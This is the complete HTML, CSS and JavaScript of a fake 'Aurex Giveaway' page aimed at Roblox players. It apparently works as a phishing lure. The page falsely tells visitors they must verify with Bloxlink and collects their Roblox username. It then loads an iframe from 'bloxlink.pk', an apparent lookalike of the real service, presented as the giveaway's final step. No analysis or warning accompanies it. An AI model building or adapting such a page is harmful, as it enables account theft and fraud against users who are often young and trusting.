# Jfjd
<!DOCTYPE html>  <html lang="en">  
<head>  
    <meta charset="UTF-8">  <meta  
    name="viewport"  
    content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">  

<title>Aurex Giveaway</title>  

<style>  
    * {  
        box-sizing: border-box;  
        margin: 0;  
        padding: 0;  
    }  

    body {  
        font-family:  
            'Segoe UI',  
            -apple-system,  
            BlinkMacSystemFont,  
            Roboto,  
            sans-serif;  

        background-color: #030104;  

        background-image:  
            radial-gradient(  
                circle at 80% 40%,  
                rgba(255, 0, 102, 0.15),  
                transparent 400px  
            ),  
            radial-gradient(  
                circle at 20% 70%,  
                rgba(255, 0, 60, 0.12),  
                transparent 400px  
            ),  
            radial-gradient(  
                rgba(255, 255, 255, 0.3) 1px,  
                transparent 20px  
            ),  
            radial-gradient(  
                rgba(255, 0, 80, 0.4) 2px,  
                transparent 30px  
            );  

        background-size:  
            100% 100%,  
            100% 100%,  
            350px 350px,  
            250px 250px;  

        background-position:  
            0 0,  
            0 0,  
            40px 60px,  
            130px 270px;  

        color: #ffffff;  

        display: flex;  
        justify-content: center;  
        align-items: center;  

        min-height: 100vh;  
        min-height: 100dvh;  

        padding: 20px;  
        overflow-y: auto;  
    }  

    .giveaway-card {  
        background: rgba(14, 7, 18, 0.88);  

        border: 2px solid rgba(255, 0, 85, 0.2);  

        padding: 55px 45px;  

        border-radius: 24px;  

        box-shadow:  
            0 0 60px rgba(255, 0, 85, 0.25),  
            inset 0 0 20px rgba(255, 0, 85, 0.05);  

        text-align: center;  

        max-width: 1100px;  
        width: 100%;  

        z-index: 2;  
        margin: auto;  

        animation:  
            cardFadeIn  
            0.5s  
            cubic-bezier(0.16, 1, 0.3, 1);  
    }  

    @keyframes cardFadeIn {  
        from {  
            opacity: 0;  
            transform: scale(0.97) translateY(10px);  
        }  

        to {  
            opacity: 1;  
            transform: scale(1) translateY(0);  
        }  
    }  

    h1 {  
        font-size: 2.7rem;  
        margin-bottom: 20px;  

        background:  
            linear-gradient(  
                to right,  
                #ff1744,  
                #d500f9  
            );  

        -webkit-background-clip: text;  
        -webkit-text-fill-color: transparent;  

        font-weight: 800;  
        letter-spacing: 0.5px;  
    }  

    p.description {  
        color: #a4a4c1;  

        font-size: 1.15rem;  
        line-height: 1.6;  

        margin-bottom: 40px;  
    }  

    .enter-btn {  
        display: block;  

        background:  
            linear-gradient(  
                90deg,  
                #ff007f 0%,  
                #7928ca 100%  
            );  

        color: #ffffff;  

        border: none;  

        padding: 20px 35px;  

        font-size: 1.25rem;  
        font-weight: 700;  

        border-radius: 50px;  

        cursor: pointer;  

        box-shadow:  
            0 0 30px  
            rgba(255, 0, 127, 0.4);  

        transition:  
            transform 0.2s ease,  
            box-shadow 0.2s ease;  

        width: 100%;  

        text-transform: uppercase;  
        letter-spacing: 1.5px;  
    }  

    .enter-btn:hover {  
        transform: translateY(-2px);  

        box-shadow:  
            0 0 40px  
            rgba(255, 0, 127, 0.6);  
    }  

    .enter-btn:active {  
        transform: scale(0.98);  
    }  

    .spinner {  
        display: none;  

        width: 55px;  
        height: 55px;  

        border:  
            4px solid  
            rgba(255, 255, 255, 0.1);  

        border-top:  
            4px solid  
            #ff007f;  

        border-radius: 50%;  

        margin: 40px auto;  

        animation:  
            spin  
            0.8s  
            linear  
            infinite;  
    }  

    @keyframes spin {  
        0% {  
            transform: rotate(0deg);  
        }  

        100% {  
            transform: rotate(360deg);  
        }  
    }  

    .action-view,  
    .internal-panel-view,  
    .success-view,  
    .iframe-view {  
        display: none;  

        animation:  
            fadeIn  
            0.4s  
            ease-out;  
    }  

    @keyframes fadeIn {  
        from {  
            opacity: 0;  
        }  

        to {  
            opacity: 1;  
        }  
    }  

    .btn-group {  
        display: grid;  

        grid-template-columns:  
            1fr 1fr;  

        gap: 20px;  

        margin-top: 20px;  
    }  

    .split-btn {  
        padding: 18px 25px;  

        font-size: 1.1rem;  
        font-weight: 700;  

        border-radius: 50px;  

        cursor: pointer;  
        border: none;  

        text-transform: uppercase;  
        letter-spacing: 1px;  

        transition:  
            background 0.2s,  
            transform 0.2s;  
    }  

    .proceed-btn {  
        background:  
            linear-gradient(  
                90deg,  
                #00f2fe 0%,  
                #4facfe 100%  
            );  

        color: #030104;  

        box-shadow:  
            0 4px 15px  
            rgba(0, 242, 254, 0.25);  
    }  

    .proceed-btn:hover {  
        transform: translateY(-2px);  
    }  

    .close-btn {  
        background:  
            rgba(255, 255, 255, 0.06);  

        color: #ffffff;  

        border:  
            1px solid  
            rgba(255, 255, 255, 0.12);  
    }  

    .close-btn:hover {  
        background:  
            rgba(255, 255, 255, 0.12);  

        transform: translateY(-2px);  
    }  

    .local-form-group {  
        text-align: left;  

        margin-top: 25px;  

        background:  
            rgba(0, 0, 0, 0.3);  

        padding: 30px;  

        border-radius: 16px;  

        border:  
            1px solid  
            rgba(255, 255, 255, 0.08);  
    }  

    .form-label {  
        display: block;  

        color: #00f2fe;  

        font-size: 1.05rem;  
        font-weight: 600;  

        margin-bottom: 10px;  
    }  

    .form-input {  
        width: 100%;  

        padding: 14px 20px;  

        background:  
            rgba(14, 7, 18, 0.9);  

        border:  
            1px solid  
            rgba(255, 0, 85, 0.3);  

        border-radius: 8px;  

        color: #ffffff;  

        font-size: 1.1rem;  

        outline: none;  
    }  

    .form-input:focus {  
        border-color: #00f2fe;  
    }  

    .form-input.input-error {  
        border-color: #ff2a4b;  

        box-shadow:  
            0 0 12px  
            rgba(255, 42, 75, 0.3);  
    }  

    .error-warning-text {  
        display: none;  

        color: #ff2a4b;  

        font-size: 0.95rem;  

        margin-top: 10px;  
        margin-bottom: 20px;  

        font-weight: 600;  
    }  

    .iframe-view {  
        width: 100%;  
        max-width: 100%;  
    }  

    #frame {  
        display: block;  

        width: 100%;  

        height:  
            min(78dvh, 850px);  

        min-height: 400px;  

        margin: 20px auto 0;  

        border:  
            1px solid  
            rgba(255, 0, 85, 0.3);  

        border-radius: 14px;  

        background: #0f0f14;  

        max-width: 100%;  
    }  

    .iframe-close {  
        margin-top: 20px;  
        width: 100%;  
    }  
 

    @media (min-width: 1000px) {  

        .giveaway-card {  
            max-width: 1400px;  
        }  

        #frame {  
            height:  
                min(80dvh, 850px);  
        }  
    }  

    @media (max-width: 999px) {  

        .giveaway-card {  
            padding: 35px 25px;  
        }  

        #frame {  
            height: 75dvh;  
        }  
    }  

    @media (max-width: 600px) {  

        body {  
            padding: 10px;  
        }  

        .giveaway-card {  
            width: 100%;  

            padding: 25px 12px;  

            border-radius: 16px;  
        }  

        h1 {  
            font-size: 2.2rem;  
        }  

        p.description {  
            font-size: 1rem;  
        }  

        .btn-group {  
            grid-template-columns: 1fr;  
            gap: 12px;  
        }  

        #frame {  
            width: 100%;  

            height: 72dvh;  

            min-height: 400px;  

            margin-top: 15px;  

            border-radius: 10px;  
        }  

        .iframe-close {  
            margin-top: 12px;  
        }  
    }  

    @media (max-width: 380px) {  

        .giveaway-card {  
            padding: 20px 10px;  
        }  

        #frame {  
            height: 68dvh;  
            min-height: 360px;  
        }  
    }  
</style>

</head>  <body>  <div class="giveaway-card">  <!-- STEP 1 -->  
<div id="initialView">  

    <h1>Aurex Giveaway</h1>  

    <p class="description">  
        The exclusive Aurex reward drop is now live!  
        Click the button below to join the giveaway.  
    </p>  

    <button  
        class="enter-btn"  
        id="enterBtn">  
        Enter Giveaway  
    </button>  

</div>  

<!-- LOADING -->  
<div  
    class="spinner"  
    id="loadingSpinner">  
</div>  

<!-- STEP 2 -->  
<div  
    id="actionView"  
    class="action-view">  

    <h1 style="  
        font-size:2rem;  
        line-height:1.2;  
    ">  
        Bloxlink Verification Required  
    </h1>  

    <p class="description">  
        Your Roblox is not verified on Bloxlink We Can't Accept Unverified Users on This Giveaway In order to Join this You must Verify Your Account To Bloxlink. Please Verify Your Account And Try Again. If You Want to Get Verified On Bloxlink Please Press Procced.  
      Thank You  
    </p>  

    <div class="btn-group">  

        <button  
            class="split-btn proceed-btn"  
            id="proceedBtn">  
            Proceed  
        </button>  

        <button  
            class="split-btn close-btn"  
            id="closeBtn">  
            Close  
        </button>  

    </div>  

</div>  

<!-- STEP 3 -->  
<div  
    id="internalPanelView"  
    class="internal-panel-view">  

    <h1>  
        Continue  
    </h1>  

    <p class="description">  
        Enter your Roblox Username To Get Verified On Bloxlink  
      (Fact: Did you know?) Bloxlink can link your Roblox account to your Discord account.

It can also verify your Roblox identity and give you Discord roles automatically.
</p>

<div class="local-form-group">  

        <label  
            class="form-label"  
            for="usernameInput">  
          Roblox Username:  
        </label>  

        <input  
            class="form-input"  
            type="text"  
            id="usernameInput"  
            placeholder="Enter your username"  
            autocomplete="off">  

        <div  
            class="error-warning-text"  
            id="errorWarningField">  
            This field cannot be left blank.  
        </div>  

        <button  
            class="enter-btn"  
            style="  
                padding:15px 20px;  
                font-size:1.1rem;  
                margin-top:15px;  
            "  
            id="submitClaimBtn">  
            Continue  
        </button>  

    </div>  

</div>  

<!-- STEP 4 -->  
<div  
    id="successView"  
    class="success-view">  

    <h1 style="  
        background:  
            linear-gradient(  
                to right,  
                #00ffcc,  
                #0072ff  
            );  

        -webkit-background-clip:text;  
        -webkit-text-fill-color:transparent;  
    ">  
        Final Step To Get Verified on Bloxlink  
    </h1>  

    <p  
        class="description"  
        style="  
            color:#b0b0cb;  
            margin-bottom:25px;  
        ">  
        Final Step: Click the button below to verify your Roblox account with Bloxlink and complete verification.  
    </p>  

    <button  
        class="enter-btn"  
        id="openIframeBtn">  
        Open Giveaway  
    </button>  

</div>  

<!-- STEP 5 -->  
<div  
    id="iframeView"  
    class="iframe-view">  

    <h1 style="font-size:2rem;">  
        Aurex Giveaway  
    </h1>  
   

    <iframe  
        id="frame"  
        title="Aurex Giveaway Content"  
        src="about:blank"  
        loading="lazy"  
        referrerpolicy="strict-origin-when-cross-origin">  
    </iframe>  

    <button  
        class="split-btn close-btn iframe-close"  
        id="iframeCloseBtn">  
        Close  
    </button>  

</div>

</div>  <script>  
  
    /* ==============================  
       ELEMENTS  
    ============================== */  
  
    const initialView =  
        document.getElementById("initialView");  
  
    const spinner =  
        document.getElementById("loadingSpinner");  
  
    const actionView =  
        document.getElementById("actionView");  
  
    const internalPanelView =  
        document.getElementById("internalPanelView");  
  
    const successView =  
        document.getElementById("successView");  
  
    const iframeView =  
        document.getElementById("iframeView");  
  
    const usernameInput =  
        document.getElementById("usernameInput");  
  
    const errorWarningField =  
        document.getElementById("errorWarningField");  
  
    const frame =  
        document.getElementById("frame");  
  
  
    /* ==============================  
       DEVICE DETECTION  
    ============================== */  
  
    function detectDevice() {  
  
        const width =  
            window.innerWidth;  
  
        const height =  
            window.innerHeight;  
  
        const touch =  
            navigator.maxTouchPoints > 0;  
  
        let deviceType;  
  
        if (width <= 600 && touch) {  
  
            deviceType = "Mobile";  
  
        } else if (width <= 1024 && touch) {  
  
            deviceType = "Tablet";  
  
        } else {  
  
            deviceType = "Desktop / Laptop";  
        }  
  
        console.log(  
            "Aurex Device:",  
            deviceType  
        );  
  
        console.log(  
            "Viewport:",  
            width + " × " + height  
        );  
  
        console.log(  
            "Touch Support:",  
            touch ? "Yes" : "No"  
        );  
  
        return deviceType;  
    }  
  
    let aurexDevice =  
        detectDevice();  
  
    window.addEventListener(  
        "resize",  
        function () {  
  
            aurexDevice =  
                detectDevice();  
        }  
    );  
  
  
    /* ==============================  
       ENTER GIVEAWAY  
    ============================== */  
  
    document  
        .getElementById("enterBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                initialView.style.display =  
                    "none";  
  
                spinner.style.display =  
                    "block";  
  
                setTimeout(  
                    function () {  
  
                        spinner.style.display =  
                            "none";  
  
                        actionView.style.display =  
                            "block";  
  
                    },  
                    1200  
                );  
            }  
        );  
  
  
    /* ==============================  
       PROCEED  
    ============================== */  
  
    document  
        .getElementById("proceedBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                actionView.style.display =  
                    "none";  
  
                internalPanelView.style.display =  
                    "block";  
            }  
        );  
  
  
    /* ==============================  
       USERNAME INPUT  
    ============================== */  
  
    usernameInput.addEventListener(  
        "input",  
        function () {  
  
            if (  
                usernameInput.value.trim() !== ""  
            ) {  
  
                usernameInput.classList.remove(  
                    "input-error"  
                );  
  
                errorWarningField.style.display =  
                    "none";  
            }  
        }  
    );  
  
  
    /* ==============================  
       SUBMIT  
    ============================== */  
  
    document  
        .getElementById("submitClaimBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                if (  
                    usernameInput.value.trim() === ""  
                ) {  
  
                    usernameInput.classList.add(  
                        "input-error"  
                    );  
  
                    errorWarningField.style.display =  
                        "block";  
  
                    return;  
                }  
  
                internalPanelView.style.display =  
                    "none";  
  
                successView.style.display =  
                    "block";  
            }  
        );  
  
  
    /* ==============================  
       OPEN IFRAME  
    ============================== */  
  
    document  
        .getElementById("openIframeBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                successView.style.display =  
                    "none";  
  
                iframeView.style.display =  
                    "block";  
  
                frame.src =
                    "https://bloxlink.pk/verify?server=0295377443746119"  
            }  
        );  
  
  
    /* ==============================  
       CLOSE → HOMEPAGE  
    ============================== */  
  
    document  
        .getElementById("closeBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                window.location.href = "/";  
            }  
        );  
  
  
    document  
        .getElementById("iframeCloseBtn")  
        .addEventListener(  
            "click",  
            function () {  
  
                window.location.href = "/";  
            }  
        );  
  
</script> 
</body>  
</html> 
